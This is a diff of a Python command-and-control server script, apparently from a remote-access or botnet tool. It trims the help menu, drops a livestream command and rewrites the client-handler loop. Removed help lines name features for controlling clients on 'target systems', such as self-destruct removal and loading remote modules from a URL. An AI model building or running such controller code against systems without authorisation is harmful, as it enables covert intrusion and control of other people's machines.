@@ -67,27 +67,14 @@ exit_status             =False
 socket.setdefaulttimeout(None)
 
 HELP_CMDS   = ''' 
-
+SERVER COMMANDS
 -----------------------------------------------------------------------------
-COMMAND               | DESCRIPTION
+command <args> [option]              | [descripton]
 ---------------------------------------------------------------------------
-client <id>            | Connect to a client
-clients                | List connected clients
-back                   | Deselect current client
-help                   | Show this help menu
-kill [id]              | Kill the client connection
-quit                   | Exit server and keep clients alive
-selfdestruct           | Remove client from target system
-run [module]           | Run module once [no selection = all modules]
-set <module> [x=y]     | Set module options
-use <module>           | Enable module
-stop <module>          | Disable module
-options                | List all options for each module
-list <type>            | List all commands or modules
-results                | List all results
-status                 | Display session status
-module <url>           | Load a new module on client from a URL
-mode <standby/active>  | Change client operating mode
+client <id>             | Connect to a client
+clients                 | List connected clients
+back                    | Deselect current client
+quit                    | Exit server and keep clients alive
 ----------------------------------------------------------------------------
 < > = required argument
 [ ] = optional argument
@@ -109,8 +96,7 @@ class Server(object):
             'help'          :   self.print_help,
             'info'          :   self.get_client_info,
             'quit'          :   self.quit_server,
-	    'sendall'	    :   self.sendall_clients,
-            'stream'        :   self.livestream_client
+	    'sendall'	    :   self.sendall_clients
             }
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -341,25 +327,23 @@ class ClientHandler(threading.Thread):
         return '\nCurrent session duration: %d days, %d hours, %d minutes, %d seconds\n' % (int(time.clock()/86400.0), int((time.clock()%86400.0)/3600.0), int((time.clock()%3600.0)/60.0), int(time.clock() % 60.0))
                  
     def run(self, prompt=None):
-        while True:
-            if exit_status:
-                break
-            with self.lock:
-                method, data = ('prompt', prompt) if prompt else server.recv_client()
-            if 'prompt' in method:
-                command = raw_input(data % int(self.name))
-                cmd, _, action = command.partition(' ')
-                if cmd in server.commands:
-                    result = server.commands[cmd](action) if len(action) else server.commands[cmd]()
-                    with self.lock:
-                        print result
-                    self.run(prompt=data)
-                else:
-                    server.send_client(command)
-                    self.run()
+        with self.lock:
+            method, data = ('prompt', prompt) if prompt else server.recv_client()
+        if 'prompt' in method:
+            command = raw_input(data % int(self.name))
+            cmd, _, action = command.partition(' ')
+            if cmd in server.commands:
+                result = server.commands[cmd](action) if len(action) else server.commands[cmd]()
+                with self.lock:
+                    print result
+                    return self.run(prompt=data)
             else:
-                if data and len(data):
-                    print data
+                server.send_client(command)
+        else:
+            if data:
+                print data
+        with self.lock:
+            return self.run()
                 
 
 class LogRecordHandler(socketserver.StreamRequestHandler):
